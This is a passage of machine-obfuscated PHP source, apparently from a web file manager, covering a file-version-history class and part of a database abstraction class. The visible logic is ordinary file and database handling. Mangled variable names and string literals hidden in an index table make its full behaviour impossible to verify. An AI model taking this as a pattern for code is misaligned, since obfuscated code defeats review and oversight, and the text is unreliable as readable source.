self::parsePath($€˜¨Ìéı->pathParse[$ ÛõğÁî[1228]]); } return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } $úÖË‚° = array(self::$_historyBase, TEMP_PATH, BASIC_PATH . $ ÛõğÁî[1316]); foreach ($úÖË‚° as $³§Š€¦Œ) { if (!$±€”œÑé && substr($§åß¬—, 0, strlen($³§Š€¦Œ)) == $³§Š€¦Œ) { return !1; } } self::log($GLOBALS[$ ÛõğÁî[1223]] . $ ÛõğÁî[1317] . $§åß¬—); return $§åß¬—; } private static function pathHistory($ĞåË‚Ñ) { $ûïƒå· =& $_SERVER[Ş­ğŠìÒ]; $Şó™åÏ = self::$_historyBase . ltrim(KodIO::clear($ĞåË‚Ñ), $ûïƒå·[8]); $Şó™åÏ = str_replace(array($ûïƒå·[1318]), array($ûïƒå·[1319]), $Şó™åÏ); return $Şó™åÏ; } public static function log($ù²İúüí) { } public static function historyCount($ü˜µ«òé) { $”öëÄ¦× =& $_SERVER[Ş­ğŠìÒ]; $³ò¸«–Ÿ = array(); $„â¸°‚ = array(); foreach ($ü˜µ«òé as $’¨×œ¤) { $î‹ŒÏ˜™ = get_path_father($’¨×œ¤); if (!$„â¸°‚[$î‹ŒÏ˜™]) { $„â¸°‚[$î‹ŒÏ˜™] = array(); } $„â¸°‚[$î‹ŒÏ˜™][] = get_path_this($’¨×œ¤); } foreach ($„â¸°‚ as $î‹ŒÏ˜™ => $Óêı«ßÇ) { $¸â’ÂÌ = self::parsePath($î‹ŒÏ˜™); if (!$¸â’ÂÌ) { continue; } foreach ($Óêı«ßÇ as $…ê³Ââä) { $ŞöÃÀŒÚ = self::listData(rtrim($¸â’ÂÌ, $”öëÄ¦×[8]) . $”öëÄ¦×[8] . $…ê³Ââä, !1); if ($ŞöÃÀŒÚ && $ŞöÃÀŒÚ[$”öëÄ¦×[445]]) { $³ò¸«–Ÿ[rtrim($î‹ŒÏ˜™, $”öëÄ¦×[8]) . $”öëÄ¦×[8] . $…ê³Ââä] = count($ŞöÃÀŒÚ[$”öëÄ¦×[445]]); } } } return $³ò¸«–Ÿ; } public static function add($ì–°œ—®) { $êí«É¹† =& $_SERVER[Ş­ğŠìÒ]; $èºÌú‹¼ = self::listData($ì–°œ—®); if (!$èºÌú‹¼) { return; } $„“´¬ˆ½ = Model($êí«É¹†[837])->get($êí«É¹†[1320]); $Ë›ß±Ä = intval($GLOBALS[$êí«É¹†[6]][$êí«É¹†[92]][$êí«É¹†[1298]]); $Éó£³£ô = $„“´¬ˆ½ == $êí«É¹†[1321] ? min(5, $Ë›ß±Ä) : $Ë›ß±Ä; if ($Ë›ß±Ä <= 0) { return; } $ìüş”¶† = IO::info($ì–°œ—®); $Õ¶ìûÖ« = $èºÌú‹¼[$êí«É¹†[445]]; if ($ìüş”¶†[$êí«É¹†[79]] == 0) { return; } if ($ìüş”¶†[$êí«É¹†[79]] >= 1024 * 1024 * 500) { return !1; } $‰éâÓ·¨ = IO::hashSimple($ì–°œ—®); if ($Õ¶ìûÖ« && $Õ¶ìûÖ«[0][$êí«É¹†[672]] == $‰éâÓ·¨) { return !0; } if (array_key_exists($êí«É¹†[233], $ìüş”¶†) && !$ìüş”¶†[$êí«É¹†[233]]) { return !1; } $÷Ñ™“­‘ = short_id(time()); $×–ï¸˜ = array($êí«É¹†[475] => $÷Ñ™“­‘, $êí«É¹†[672] => $‰éâÓ·¨, $êí«É¹†[32] => $ìüş”¶†[$êí«É¹†[32]] . $êí«É¹†[10] . date($êí«É¹†[1322]) . rand_string(1), $êí«É¹†[79] => $ìüş”¶†[$êí«É¹†[79]], $êí«É¹†[527] => USER_ID, $êí«É¹†[231] => time(), $êí«É¹†[1323] => $êí«É¹†[12]); IO::mkdir($èºÌú‹¼[$êí«É¹†[1324]]); $æÆßŠí° = IO::copy($ì–°œ—®, $èºÌú‹¼[$êí«É¹†[1324]], !1, $×–ï¸˜[$êí«É¹†[32]]); if (!$æÆßŠí°) { self::clearEmptyFolder($èºÌú‹¼[$êí«É¹†[1324]]); return !1; } array_unshift($Õ¶ìûÖ«, $×–ï¸˜); if (count($Õ¶ìûÖ«) > $Éó£³£ô) { $‹¸é … = array_slice($Õ¶ìûÖ«, $Éó£³£ô); foreach ($‹¸é … as $Ø´²­¿) { IO::remove($èºÌú‹¼[$êí«É¹†[1324]] . $Ø´²­¿[$êí«É¹†[32]]); } $Õ¶ìûÖ« = array_slice($Õ¶ìûÖ«, 0, $Éó£³£ô); } return self::saveData($èºÌú‹¼[$êí«É¹†[1325]], $Õ¶ìûÖ«); } public static function remove($Í±¿ ‹¥, $û§«©‘°) { $¹ÛÇ­à =& $_SERVER[Ş­ğŠìÒ]; $‰Èâ¿ñË = self::listData($Í±¿ ‹¥); $ÏéŞ£Á» = array(); if (!$‰Èâ¿ñË) { return !1; } foreach ($‰Èâ¿ñË[$¹ÛÇ­à[445]] as $ö°˜œ¸­) { if ($ö°˜œ¸­[$¹ÛÇ­à[475]] == $û§«©‘°) { IO::remove($‰Èâ¿ñË[$¹ÛÇ­à[1324]] . $ö°˜œ¸­[$¹ÛÇ­à[32]]); continue; } $ÏéŞ£Á»[] = $ö°˜œ¸­; } return self::saveData($‰Èâ¿ñË[$¹ÛÇ­à[1325]], $ÏéŞ£Á»); } public static function clear($à¶èÉƒ¿, $õÁ—‰Ä = true) { $«’ÔÃš =& $_SERVER[Ş­ğŠìÒ]; $ÛÑèù…å = self::listData($à¶èÉƒ¿, $õÁ—‰Ä); if (!$ÛÑèù…å) { return !1; } foreach ($ÛÑèù…å[$«’ÔÃš[445]] as $¤Ä¹È—¾) { IO::remove($ÛÑèù…å[$«’ÔÃš[1324]] . $¤Ä¹È—¾[$«’ÔÃš[32]]); } return self::saveData($ÛÑèù…å[$«’ÔÃš[1325]], array()); } public static function moveHistory($°Ó–Àè¶, $óÓÏı¤ş = '', $ÏÉçÈÈ = '') { $ÛÅ¾¯ÁÔ =& $_SERVER[Ş­ğŠìÒ]; $¸†¬Ç‹Â = self::listData($°Ó–Àè¶, !1); if (!$¸†¬Ç‹Â || !$¸†¬Ç‹Â[$ÛÅ¾¯ÁÔ[445]]) { return !1; } $™Ç™¾™€ = $ÛÅ¾¯ÁÔ[1312]; $óÓÏı¤ş = $óÓÏı¤ş ? $óÓÏı¤ş : get_path_this($°Ó–Àè¶); $ÏÉçÈÈ = $ÏÉçÈÈ ? $ÏÉçÈÈ : $¸†¬Ç‹Â[$ÛÅ¾¯ÁÔ[1324]]; $äÅâ¢¡¨ = substr(get_path_this($¸†¬Ç‹Â[$ÛÅ¾¯ÁÔ[1325]]), 0, -strlen($™Ç™¾™€)); foreach ($¸†¬Ç‹Â[$ÛÅ¾¯ÁÔ[445]] as $¸Ú§Ë´ => $¹ŒÜè­Ü) { $ÁÇ±‹Ğ = $óÓÏı¤ş . substr($¹ŒÜè­Ü[$ÛÅ¾¯ÁÔ[32]], strlen($äÅâ¢¡¨)); $Âóö‘¶ = IO::move($¸†¬Ç‹Â[$ÛÅ¾¯ÁÔ[1324]] . $¹ŒÜè­Ü[$ÛÅ¾¯ÁÔ[32]], $ÏÉçÈÈ, !1, $ÁÇ±‹Ğ); if ($Âóö‘¶) { $¸†¬Ç‹Â[$ÛÅ¾¯ÁÔ[445]][$¸Ú§Ë´][$ÛÅ¾¯ÁÔ[32]] = $ÁÇ±‹Ğ; } } $¸†¬Ç‹Â[$ÛÅ¾¯ÁÔ[1325]] = IO::move($¸†¬Ç‹Â[$ÛÅ¾¯ÁÔ[1325]], $ÏÉçÈÈ, !1, $óÓÏı¤ş . $™Ç™¾™€); self::saveData($¸†¬Ç‹Â[$ÛÅ¾¯ÁÔ[1325]], $¸†¬Ç‹Â[$ÛÅ¾¯ÁÔ[445]]); self::clearEmptyFolder($¸†¬Ç‹Â[$ÛÅ¾¯ÁÔ[1324]]); } public static function rollback($¢Ò¢ÄÏµ, $¯«Å£¯¤) { $•…ş¶®† =& $_SERVER[Ş­ğŠìÒ]; $Œ¥Òø©¹ = self::listData($¢Ò¢ÄÏµ); if (!$Œ¥Òø©¹) { return; } $‰¨ü¾ÊÇ = IO::info($¢Ò¢ÄÏµ); foreach ($Œ¥Òø©¹[$•…ş¶®†[445]] as $é‚æÌìÔ => $‘ğÈú‹È) { if ($‘ğÈú‹È[$•…ş¶®†[475]] == $¯«Å£¯¤) { self::add($¢Ò¢ÄÏµ); $‰ÔËöçï = $Œ¥Òø©¹[$•…ş¶®†[1324]] . $‘ğÈú‹È[$•…ş¶®†[32]]; $‹êÏİ™ = IO::copy($‰ÔËöçï, IO::pathFather($¢Ò¢ÄÏµ), REPEAT_REPLACE, $‰¨ü¾ÊÇ[$•…ş¶®†[32]]); if ($‹êÏİ™) { self::remove($¢Ò¢ÄÏµ, $¯«Å£¯¤); } return $‹êÏİ™; } } return !1; } public static function setDetail($•êÛÎ, $…ø§éšƒ, $·èì½¦Ä) { $¤’öô©ï =& $_SERVER[Ş­ğŠìÒ]; $‹ƒŸ™¹Ü = self::listData($•êÛÎ); if (!$‹ƒŸ™¹Ü) { return; } foreach ($‹ƒŸ™¹Ü[$¤’öô©ï[445]] as $Àê¼È‰ => $²Àª”ªß) { if ($²Àª”ªß[$¤’öô©ï[475]] == $…ø§éšƒ) { $‹ƒŸ™¹Ü[$¤’öô©ï[445]][$Àê¼È‰][$¤’öô©ï[1323]] = $·èì½¦Ä; self::saveData($‹ƒŸ™¹Ü[$¤’öô©ï[1325]], $‹ƒŸ™¹Ü[$¤’öô©ï[445]]); return !0; } } return !1; } public static function fileInfo($¥…úÖÊÈ, $Äª¬Ò“¥) { $Æ›ƒ¬£ =& $_SERVER[Ş­ğŠìÒ]; $ƒ’ŒÇùŸ = self::listData($¥…úÖÊÈ); if (!$ƒ’ŒÇùŸ) { show_json(LNG($Æ›ƒ¬£[108]), !1); } $üşÎæšÁ = $Æ›ƒ¬£[12]; foreach ($ƒ’ŒÇùŸ[$Æ›ƒ¬£[445]] as $¢û²ğíÄ => $„ø¦Âšğ) { if ($„ø¦Âšğ[$Æ›ƒ¬£[475]] != $Äª¬Ò“¥) { continue; } $üşÎæšÁ = $ƒ’ŒÇùŸ[$Æ›ƒ¬£[1324]] . $„ø¦Âšğ[$Æ›ƒ¬£[32]]; break; } if (!$üşÎæšÁ) { show_json(LNG($Æ›ƒ¬£[108]), !1); } return IO::info($üşÎæšÁ); } public static function fileOut($Û¿›ÉÊ¬, $Î¿ÆÌÀÒ, $Ú•ŠšÃ‘ = false) { $¿ê¥û·œ =& $_SERVER[Ş­ğŠìÒ]; $­¶Â¸Ğ = self::fileInfo($Û¿›ÉÊ¬, $Î¿ÆÌÀÒ); $Ç‹‹õ¸” =& $GLOBALS[$¿ê¥û·œ[7]]; $Ú•ŠšÃ‘ = isset($Ç‹‹õ¸”[$¿ê¥û·œ[1275]]) && $Ç‹‹õ¸”[$¿ê¥û·œ[1275]] == 1; if (isset($Ç‹‹õ¸”[$¿ê¥û·œ[33]]) && $Ç‹‹õ¸”[$¿ê¥û·œ[33]] == $¿ê¥û·œ[1326]) { return IO::fileOutImage($­¶Â¸Ğ[$¿ê¥û·œ[87]], $Ç‹‹õ¸”[$¿ê¥û·œ[1327]]); } IO::fileOut($­¶Â¸Ğ[$¿ê¥û·œ[87]], $Ú•ŠšÃ‘, get_path_this($Û¿›ÉÊ¬)); } public static function listData($œğæØŠ³, $Ö¶‚£– = true) { $µ£‘ô·è =& $_SERVER[Ş­ğŠìÒ]; if ($Ö¶‚£– && !IO::exist($œğæØŠ³)) { return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } if (substr($œğæØŠ³, 0, strlen(TEMP_PATH)) == TEMP_PATH) { return !1; } $ı¶óü‹“ = self::pathHistory($œğæØŠ³); $ÁÆÆÏúß = array($µ£‘ô·è[1325] => $ı¶óü‹“ . $µ£‘ô·è[1312], $µ£‘ô·è[1324] => rtrim(get_path_father($ı¶óü‹“), $µ£‘ô·è[8]) . $µ£‘ô·è[8], $µ£‘ô·è[445] => array()); $ñ»¡šµ¥ = IO::getContent($ÁÆÆÏúß[$µ£‘ô·è[1325]]); if ($ñ»¡šµ¥) { $¨êâŒÜ‰ = json_decode($ñ»¡šµ¥, !0); if (is_array($¨êâŒÜ‰)) { $ÁÆÆÏúß[$µ£‘ô·è[445]] = $¨êâŒÜ‰; } } return $ÁÆÆÏúß; } private static function saveData($Ì…íŒ›, $¦Ï¶‹Ê›) { $íìóğàé =& $_SERVER[Ş­ğŠìÒ]; self::log($íìóğàé[1328] . $Ì…íŒ› . $íìóğàé[74] . count($¦Ï¶‹Ê›), $íìóğàé[819]); if ($¦Ï¶‹Ê›) { return IO::setContent($Ì…íŒ›, json_encode($¦Ï¶‹Ê›)); } $ÃÕ „Ú– = IO::pathFather($Ì…íŒ›); IO::remove($Ì…íŒ›); self::clearEmptyFolder($ÃÕ „Ú–); return !0; } public static function clearEmptyFolder($›ÅÙ´) { $‰á‡ŒÁô =& $_SERVER[Ş­ğŠìÒ]; if (trim($›ÅÙ´, $‰á‡ŒÁô[8]) == trim(self::$_historyBase, $‰á‡ŒÁô[8])) { return; } $—ÀÎË ô = IO::pathFather($›ÅÙ´); $¾Ã’ûµ = IO::has($›ÅÙ´, !0); if ($¾Ã’ûµ[$‰á‡ŒÁô[239]] > 0 || $¾Ã’ûµ[$‰á‡ŒÁô[240]] > 0) { return; } IO::remove($›ÅÙ´); self::clearEmptyFolder($—ÀÎË ô); } private static function getBasePath() { $ëø›÷Ôõ =& $_SERVER[Ş­ğŠìÒ]; $üÙ×÷è = Model($ëø›÷Ôõ[1329])->get($ëø›÷Ôõ[1330]); if ($üÙ×÷è) { if (!IO::exist($üÙ×÷è)) { IO::mkdir($üÙ×÷è); } if (get_path_this($üÙ×÷è) == $ëø›÷Ôõ[1315]) { $¬«¡–ô = $ëø›÷Ôõ[1331] . rand_string(8); @rename($üÙ×÷è, get_path_father($üÙ×÷è) . $ëø›÷Ôõ[8] . $¬«¡–ô); $üÙ×÷è = DATA_PATH . $¬«¡–ô . $ëø›÷Ôõ[8]; file_put_contents(DATA_PATH . $ëø›÷Ôõ[1262], $ëø›÷Ôõ[12]); Model($ëø›÷Ôõ[1329])->set($ëø›÷Ôõ[1330], $üÙ×÷è); } return $üÙ×÷è; } $üÙ×÷è = DATA_PATH . $ëø›÷Ôõ[1331] . rand_string(8) . $ëø›÷Ôõ[8]; $üÙ×÷è = IO::mkdir($üÙ×÷è); $üÙ×÷è = rtrim($üÙ×÷è, $ëø›÷Ôõ[8]) . $ëø›÷Ôõ[8]; file_put_contents($üÙ×÷è . $ëø›÷Ôõ[1262], $ëø›÷Ôõ[12]); file_put_contents(DATA_PATH . $ëø›÷Ôõ[1262], $ëø›÷Ôõ[12]); Model($ëø›÷Ôõ[1329])->set($ëø›÷Ôõ[1330], $üÙ×÷è); return $üÙ×÷è; } } goto aµ·ä”ò‡; B½½ˆÕÕĞ¥: class DbSqlite3 extends DbSqlite3Base { public function query($Ùá†ÏŸ) { $ç¸­¹©Š =& $_SERVER[Ş­ğŠìÒ]; if (!CacheLock::fileLock($ç¸­¹©Š[13])) { return !1; } $¬ö‡òßğ = parent::query($Ùá†ÏŸ); CacheLock::fileUnLock($ç¸­¹©Š[13]); return $¬ö‡òßğ; } public function execute($ÌĞ‚Ååµ) { $ùÃÅ¥µê =& $_SERVER[Ş­ğŠìÒ]; if (!CacheLock::fileLock($ùÃÅ¥µê[13])) { return !1; } $êíá¹¼ = parent::execute($ÌĞ‚Ååµ); CacheLock::fileUnLock($ùÃÅ¥µê[13]); return $êíá¹¼; } } class Db { protected $dbType = null; protected $autoFree = false; protected $model = "\x5f\164\x68\x69\x6e\153\x5f"; protected $pconnect = false; protected $queryStr = ''; protected $modelSql = array(); protected $lastInsID = null; protected $numRows = 0; protected $numCols = 0; protected $transTimes = 0; protected $error = ''; protected $linkID = array(); protected $_linkID = null; protected $queryID = null; protected $connected = false; protected $config = ''; protected $configLast = ''; protected $exp = array("\145\161" => "\75", "\156\x65\161" => "\74\x3e", "\x67\x74" => "\x3e", "\x65\x67\164" => "\76\x3d", "\154\x74" => "\x3c", "\x65\154\x74" => "\x3c\75", "\156\157\x74\154\x69\153\x65" => "\x4e\117\x54\x20\114\111\x4b\105", "\x6c\x69\153\145" => "\x4c\x49\113\x45", "\x69\156" => "\x49\x4e", "\156\157\x74\151\156" => "\x4e\x4f\124\40\x49\x4e", "\x6e\157\x74\x20\x69\156" => "\116\117\124\x20\111\x4e", "\x62\145\164\167\x65\x65\x6e" => "\102\x45\124\127\105\x45\116", "\156\x6f\x74\x62\145\x74\x77\x65\x65\x6e" => "\x4e\117\124\x20\102\x45\x54\127\105\105\x4e", "\156\x6f\164\x20\x62\x65\164\167\145\x65\156" => "\x4e\x4f\x54\40\x42\105\124\x57\105\105\116"); protected $selectSql = "\x53\x45\114\105\103\124\x25\104\x49\123\124\x49\116\103\124\x25\x20\x25\x46\x49\105\x4c\104\x25\x20\x46\x52\117\115\x20\x25\124\x41\102\x4c\105\x25\45\112\x4f\111\x4e\45\45\x57\110\x45\122\x45\45\x25\x47\x52\117\x55\120\x25\x25\x48\101\x56\x49\x4e\x47\45\x25\117\122\104\105\122\x25\x25\x4c\x49\x4d\x49\x54\45\40\x25\x55\x4e\x49\117\x4e\45\45\103\x4f\x4d\115\105\116\x54\x25"; protected $bind = array(); public static function getInstance() { $ø‚„‡ƒª = func_get_args(); return think_get_instance_of(__CLASS__, $_SERVER[Ş­ğŠìÒ][1034], $ø‚„‡ƒª); } public function factory($ë¶í²ı­ = '') { $²Ú¹’¤  =& $_SERVER[Ş­ğŠìÒ]; $ë¶í²ı­ = $this->parseConfig($ë¶í²ı­); if (empty($ë¶í²ı­[$²Ú¹’¤ [1035]])) { think_exception(think_lang($²Ú¹’¤ [1036])); } $this->dbType = ucwords(strtolower($ë¶í²ı­[$²Ú¹’¤ [1035]])); $½Ã½µšñ = $²Ú¹’¤ [1037] . $this->dbType; if (class_exists($½Ã½µšñ)) { $÷¨²€úà = new $½Ã½µšñ($ë¶í²ı­); if ($²Ú¹’¤ [1038] != strtolower($ë¶í²ı­[$²Ú¹’¤ [1035]])) { $÷¨²€úà->dbType = strtoupper($this->dbType); } else { $÷¨²€úà->dbType = $this->_getDsnType($ë¶í²ı­[$²Ú¹’¤ [990]]); } } else { think_exception(think_lang($²Ú¹’¤ [1039]) . $²Ú¹’¤ [1040] . $½Ã½µšñ); } return $÷¨²€úà; } public function __call($¨¬–êè, $Âµ€ç“ş) { if (method_exists($this, $¨¬–êè)) { return call_user_func_array(array($this, $¨¬–êè), $Âµ€ç“ş); } } protected function _getDsnType($«û¼Çä) { $“• Ç´ø = explode($_SERVER[Ş­ğŠìÒ][4], $«û¼Çä); $›Ù¼Ù× = strtoupper(trim($“• Ç´ø[0])); return $›Ù¼Ù×; } private function parseConfig($¾Õß¶åĞ = '') { $½÷ È‡Í =& $_SERVER[Ş­ğŠìÒ]; if (!empty($¾Õß¶åĞ) && is_string($¾Õß¶åĞ)) { $¾Õß¶åĞ = $this->parseDSN($¾Õß¶åĞ); } elseif (is_array($¾Õß¶åĞ)) { $¾Õß¶åĞ = array_change_key_case($¾Õß¶åĞ); $¾Õß¶åĞ = array($½÷ È‡Í[1035] => $¾Õß¶åĞ[$½÷ È‡Í[1041]], $½÷ È‡Í[962] => $¾Õß¶åĞ[$½÷ È‡Í[1042]], $½÷ È‡Í[963] => $¾Õß¶åĞ[$½÷ È‡Í[1043]], $½÷ È‡Í[960] => $¾Õß¶åĞ[$½÷ È‡Í[1044]], $½÷ È‡Í[961] => $¾Õß¶åĞ[$½÷ È‡Í[1045]], $½÷ È‡Í[21] => $¾Õß¶åĞ[$½÷ È‡Í[1046]], $½÷ È‡Í[990] => $¾Õß¶åĞ[$½÷ È‡Í[1047]], $½÷ È‡Í[17] => isset($¾Õß¶åĞ[$½÷ È‡Í[1048]]) ? $¾Õß¶åĞ[$½÷ È‡Í[1048]] : array()); } elseif (empty($¾Õß¶åĞ)) { if (think_config($½÷ È‡Í[1049]) && $½÷ È‡Í[1038] != strtolower(think_config($½÷ È‡Í[1050]))) { $¾Õß¶åĞ = $this->parseDSN(think_config($½÷ È‡Í[1049])); } else { $¾Õß¶åĞ = array($½÷ È‡Í[1035] => think_config($½÷ È‡Í[1050]), $½÷ È‡Í[962] => think_config($½÷ È‡Í[1051]), $½÷ È‡Í[963] => think_config($½÷ È‡Í[1052]), $½÷ È‡Í[960] => think_config($½÷ È‡Í[1053]), $½÷ È‡Í[961] => think_config($½÷ È‡Í[1054]), $½÷ È‡Í[21] => think_config($½÷ È‡Í[323]), $½÷ È‡Í[990] => think_config($½÷ È‡Í[1049]), $½÷ È‡Í[17] => think_config($½÷ È‡Í[1055])); } } return $¾Õß¶åĞ; } protected function initConnect($ìë¤¤” = true) { if (1 == think_config($_SERVER[Ş­ğŠìÒ][22])) { $this->_linkID = $this->multiConnect($ìë¤¤”); } else { if (isset($this->config) && $this->config) { $this->configLast = $this->config; } } if (!isset($this->connected) || !$this->connected) { $this->_linkID = $this->connect(); } } protected function closeConnect() { if (!$this->connected) { return; } foreach ($this->linkID as $Ì®ƒá¸® => $©®„±ˆ¤) { $this->_linkID = $©®„±ˆ¤; $this->close(); } $this->linkID = array(); $this->_linkID = null; $this->connected = !1; if (!$this->config && $this->configLast) { $this->config = $this->configLast; } } protected function multiConnect($‹ø»İô¿ = false) { $³‘ƒ–é‹ =& $_SERVER[Ş­ğŠìÒ]; static $ñıã„Í = array(); static $„Œ³•´“ = -1; if (empty($ñıã„Í)) { foreach ($this->config as $…¬…Çü” => $Şïˆ„Ó—) { $ñıã„Í[$…¬…Çü”] = explode($³‘ƒ–é‹[50], $Şïˆ„Ó—); } } if (think_config($³‘ƒ–é‹[1056])) { if ($‹ø»İô¿ || think_config($³‘ƒ–é‹[471]) === !0) { $Ë¹çúÉù = floor(mt_rand(0, think_config($³‘ƒ–é‹[1057]) - 1)); $„Œ³•´“ = $Ë¹çúÉù; } else { if (is_numeric(think_config($³‘ƒ–é‹[1058]))) { $Ë¹çúÉù = think_config($³‘ƒ–é‹[1058]); } else { $Ë¹çúÉù = floor(mt_rand(think_config($³‘ƒ–é‹[1057]), count($ñıã„Í[$³‘ƒ–é‹[960]]) - 1)); } } } else { $Ë¹çúÉù = floor(mt_rand(0, count($ñıã„Í[$³‘ƒ–é‹[960]]) - 1)); $„Œ³•´“ = $Ë¹çúÉù; } $Ë¹çúÉù = $„Œ³•´“ !== -1 ? $„Œ³•´“ : $Ë¹çúÉù; $šÃ–ÃŒö = array($³‘ƒ–é‹[962] => isset($ñıã„Í[$³‘ƒ–é‹[962]][$Ë¹çúÉù]) ? $ñıã„Í[$³‘ƒ–é‹[962]][$Ë¹çúÉù] : $ñıã„Í[$³‘ƒ–é‹[962]][0], $³‘ƒ–é‹[963] => isset($ñıã„Í[$³‘ƒ–é‹[963]][$Ë¹çúÉù]) ? $ñıã„Í[$³‘ƒ–é‹[963]][$Ë¹çúÉù] : $ñıã„Í[$³‘ƒ–é‹[963]][0], $³‘ƒ–é‹[960] => isset($ñıã„Í[$³‘ƒ–é‹[960]][$Ë¹çúÉù]) ? $ñıã„Í[$³‘ƒ–é‹[960]][$Ë¹çúÉù] : $ñıã„Í[$³‘ƒ–é‹[960]][0], $³‘ƒ–é‹[961] => isset($ñıã„Í[$³‘ƒ–é‹[961]][$Ë¹çúÉù]) ? $ñıã„Í[$³‘ƒ–é‹[961]][$Ë¹çúÉù] : $ñıã„Í[$³‘ƒ–é‹[961]][0], $³‘ƒ–é‹[21] => isset($ñıã„Í[$³‘ƒ–é‹[21]][$Ë¹çúÉù]) ? $ñıã„Í[$³‘ƒ–é‹[21]][$Ë¹çúÉù] : $ñıã„Í[$³‘ƒ–é‹[21]][0], $³‘ƒ–é‹[990] => isset($ñıã„Í[$³‘ƒ–é‹[990]][$Ë¹çúÉù]) ? $ñıã„Í[$³‘ƒ–é‹[990]][$Ë¹çúÉù] : $ñıã„Í[$³‘ƒ–é‹[990]][0], $³‘ƒ–é‹[17] => isset($ñıã„Í[$³‘ƒ–é‹[17]][$Ë¹çúÉù]) ? $ñıã„Í[$³‘ƒ–é‹[17]][$Ë¹çúÉù] : $ñıã„Í[$³‘ƒ–é‹[17]][0]); return $this->connect($šÃ–ÃŒö, $Ë¹çúÉù); } public function parseDSN($µÊÎ“) { $º¤Œ£€‡ =& $_SERVER[Ş­ğŠìÒ]; if (empty($µÊÎ“)) { return !1; } $Ñ«ˆÏòÄ = parse_url($µÊÎ“); if ($Ñ«ˆÏòÄ[$º¤Œ£€‡[207]]) { $ÉÁİ¾âí = array($º¤Œ£€‡[1035] => $Ñ«ˆÏòÄ[$º¤Œ£€‡[207]], $º¤Œ£€‡[962] => isset($Ñ«ˆÏòÄ[$º¤Œ£€‡[662]]) ? $Ñ«ˆÏòÄ[$º¤Œ£€‡[662]] : $º¤Œ£€‡[12], $º¤Œ£€‡[963] => isset($Ñ«ˆÏòÄ[$º¤Œ£€‡[1059]]) ? $Ñ«ˆÏòÄ[$º¤Œ£€‡[1059]] : $º¤Œ£€‡[12], $º¤Œ£€‡[960] => isset($Ñ«ˆÏòÄ[$º¤Œ£€‡[208]]) ? $Ñ«ˆÏòÄ[$º¤Œ£€‡[208]] : $º¤Œ£€‡[12], $º¤Œ£€‡[961] => isset($Ñ«ˆÏòÄ[$º¤Œ£€‡[209]]) ? $Ñ«ˆÏòÄ[$º¤Œ£€‡[209]] : $º¤Œ£€‡[12], $º¤Œ£€‡[21] => isset($Ñ«ˆÏòÄ[$º¤Œ£€‡[87]]) ? substr($Ñ«ˆÏòÄ[$º¤Œ£€‡[87]], 1) : $º¤Œ£€‡[12]); } else { preg_match($º¤Œ£€‡[1060], trim($µÊÎ“), $¨“†åÛœ); $ÉÁİ¾âí = array($º¤Œ£€‡[1035] => $¨“†åÛœ[1], $º¤Œ£€‡[962] => $¨“†åÛœ[2], $º¤Œ£€‡[963] => $¨“†åÛœ[3], $º¤Œ£€‡[960] => $¨“†åÛœ[4], $º¤Œ£€‡[961] => $¨“†åÛœ[5], $º¤Œ£€‡[21] => $¨“†åÛœ[6]); } $ÉÁİ¾âí[$º¤Œ£€‡[990]] = $º¤Œ£€‡[12]; return $ÉÁİ¾âí; } protected function debug() { $ øÅä×ó =& $_SERVER[Ş­ğŠìÒ]; $this->modelSql[$this->model] = $this->queryStr; $this->model = $ øÅä×ó[1061]; if (think_config($ øÅä×ó[1062])) { think_status($ øÅä×ó[1063]); think_trace($this->queryStr . $ øÅä×ó[1064] . think_status($ øÅä×ó[24], $ øÅä×ó[1063], 6) . $ øÅä×ó[1065], $ øÅä×ó[12], $ øÅä×ó[1066]); } } protected function parseLock($Æòç°Âµ = false) { $¦…÷† =& $_SERVER[Ş­ğŠìÒ]; if (!$Æòç°Âµ) { return $¦…÷†[12]; } if ($¦…÷†[992] == $this->dbType) { return $¦…÷†[1067]; } return $¦…÷†[1068]; } protected function parseSet($ÀåØ”˜¸) { $ŸÙ³ÏŠ® =& $_SERVER[Ş­ğŠìÒ]; foreach ($ÀåØ”˜¸ as $ …¨œ¸ => $ı¹ÏáÇô) { if (is_array($ı¹ÏáÇô) && $ŸÙ³ÏŠ®[373] == $ı¹ÏáÇô[0]) { $‡€‘¶×Õ[] = $this->parseKey($ …¨œ¸) . $ŸÙ³ÏŠ®[957] . $ı¹ÏáÇô[1]; } elseif (is_scalar($ı¹ÏáÇô) || is_null($ı¹ÏáÇô)) { $‡€‘¶×Õ[] = $this->parseKey($ …¨œ¸) . $ŸÙ³ÏŠ®[957] . $this->parseValue($ı¹ÏáÇô); } } return $ŸÙ³ÏŠ®[1069] . implode($ŸÙ³ÏŠ®[50], $‡€‘¶×Õ); } protected function bindParam($ÑÖ’ñå§, $•ßõ¾äğ) { $this->bind[$_SERVER[Ş­ğŠìÒ][4] . $ÑÖ’ñå§] = $•ßõ¾äğ; } protected function parseBind($”£ÅˆÄ) { $”£ÅˆÄ = array_merge($this->bind, $”£ÅˆÄ); $this->bind = array(); return $”£ÅˆÄ; } function parseKey(&$ŠÈ¸øÓ±, $†ƒ®í¿ = true) { if ($†ƒ®í¿) { $ŠÈ¸øÓ± = $this->parseKeyCheck($ŠÈ¸øÓ±); } return $ŠÈ¸øÓ±; } function parseKeyCheck($¥£ì§Â·) { $³ÎÏ„ =& $_SERVER[Ş­ğŠìÒ]; $¥£ì§Â· = trim($¥£ì§Â·); if (!preg_match($³ÎÏ„[1070], $¥£ì§Â·)) { think_exception($³ÎÏ„[1071] . $¥£ì§Â·); } return $¥£ì§Â·; } protected function parseValue($º·ï‹Åï) { $»µ™ ´Š =& $_SERVER[Ş­ğŠìÒ]; if (is_string($º·ï‹Åï)) { $º·ï‹Åï = $»µ™ ´Š[1031] . $this->escapeString($º·ï‹Åï) . $»µ™ ´Š[1031]; } elseif (isset($º·ï‹Åï[0]) && is_string($º·ï‹Åï[0]) && strtolower($º·ï‹Åï[0]) == $»µ™ ´Š[373]) { $º·ï‹Åï = $this->escapeString($º·ï‹Åï[1]); } elseif (is_array($º·ï‹Åï)) { $º·ï‹Åï = array_map(array($this, $»µ™ ´Š[1032]), $º·ï‹Åï); } elseif (is_bool($º·ï‹Åï)) { $º·ï‹Åï = $º·ï‹Åï ? $»µ™ ´Š[91] : $»µ™ ´Š[228]; } elseif (is_null($º·ï‹Åï)) { $º·ï‹Åï = $»µ™ ´Š[106]; } return $º·ï‹Åï; } protected function parseField($ù¹ÓëŠ ) { $ ¢ÅºÍ =& $_SERVER[Ş­ğŠìÒ]; if (is_string($ù¹ÓëŠ ) && strpos($ù¹ÓëŠ , $ ¢ÅºÍ[50])) { 